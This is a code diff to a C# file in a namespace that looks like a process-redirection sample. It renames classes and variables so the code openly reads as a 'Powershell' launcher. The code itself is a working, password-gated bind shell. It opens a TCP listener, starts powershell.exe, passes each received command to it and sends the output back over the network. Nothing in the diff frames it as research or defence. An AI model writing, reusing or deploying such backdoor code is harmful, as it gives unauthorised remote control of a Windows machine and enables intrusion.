@@ -9,11 +9,11 @@ using System.Runtime.InteropServices;
 
 namespace ProcessAsyncStreamSamples
 {
-    class SortOutputRedirection1
+    class Powershell
     {
         // Define static variables shared by class methods.
-        private static StringBuilder sortOutput = null;
-        public static void SortInputListText(string SERVER_IP, int port,string pass)
+        private static StringBuilder sendOutput = null;
+        public static void Createprocess(string SERVER_IP, int port,string pass)
         {
             //---listen at the specified IP and port no.---
             IPAddress localAdd = IPAddress.Parse(SERVER_IP);
@@ -37,16 +37,16 @@ namespace ProcessAsyncStreamSamples
             }
             byte[] outputbuf3 = ASCIIEncoding.ASCII.GetBytes("password correct");
             nwStream.Write(outputbuf3, 0, outputbuf3.Length);
-            Process sortProcess = new Process();
-            sortProcess.StartInfo.FileName = "powershell.exe";
-            sortProcess.StartInfo.UseShellExecute = false;
-            sortProcess.StartInfo.RedirectStandardOutput = true;
-            sortOutput = new StringBuilder();
-            sortProcess.OutputDataReceived += SortOutputHandler;
-            sortProcess.StartInfo.RedirectStandardInput = true;
-            sortProcess.Start();
-            StreamWriter sortStreamWriter = sortProcess.StandardInput;
-            sortProcess.BeginOutputReadLine();
+            Process powershell = new Process();
+            powershell.StartInfo.FileName = "powershell.exe";
+            powershell.StartInfo.UseShellExecute = false;
+            powershell.StartInfo.RedirectStandardOutput = true;
+            sendOutput = new StringBuilder();
+            powershell.OutputDataReceived += SendOutputHandler;
+            powershell.StartInfo.RedirectStandardInput = true;
+            powershell.Start();
+            StreamWriter StreamWriter = powershell.StandardInput;
+            powershell.BeginOutputReadLine();
             String inputText;
             try
             {
@@ -60,24 +60,24 @@ namespace ProcessAsyncStreamSamples
                     {
                         byte[] outputbuf2 = ASCIIEncoding.ASCII.GetBytes("good bye");
                         nwStream.Write(outputbuf2, 0, outputbuf2.Length);
-                        sortStreamWriter.Close();
-                        sortProcess.WaitForExit();
-                        sortProcess.Close();
+                        StreamWriter.Close();
+                        powershell.WaitForExit();
+                        powershell.Close();
                         client.Close();
                         listener.Stop();
                         break;
                     }
-                    sortOutput.Clear();
+                    sendOutput.Clear();
                     if (!String.IsNullOrEmpty(inputText))
                     {
-                        sortStreamWriter.WriteLine(inputText);
+                        StreamWriter.WriteLine(inputText);
                         Thread.Sleep(1500);
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(sortOutput.ToString());
+                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(sendOutput.ToString());
                         nwStream.Write(outputbuf, 0, outputbuf.Length);
                     }
-                    if (String.IsNullOrEmpty(sortOutput.ToString()))
+                    if (String.IsNullOrEmpty(sendOutput.ToString()))
                     {
-                        sortStreamWriter.WriteLine(inputText);
+                        StreamWriter.WriteLine(inputText);
                         Thread.Sleep(1500);
                         byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes("ur command havent any output");
                         nwStream.Write(outputbuf, 0, outputbuf.Length);
@@ -88,21 +88,21 @@ namespace ProcessAsyncStreamSamples
             }
             catch
             {
-                sortStreamWriter.Close();
-                sortProcess.WaitForExit();
-                sortProcess.Close();
+                StreamWriter.Close();
+                powershell.WaitForExit();
+                powershell.Close();
                 client.Close();
                 listener.Stop();
             }
 
         }
-        private static void SortOutputHandler(object sendingProcess,
+        private static void SendOutputHandler(object sendingProcess,
             DataReceivedEventArgs outLine)
         {
             // Collect the sort command output.
             if (!String.IsNullOrEmpty(outLine.Data))
             {
-                sortOutput.Append(Environment.NewLine +
+                sendOutput.Append(Environment.NewLine +
                     $" {outLine.Data}");
             }
         }
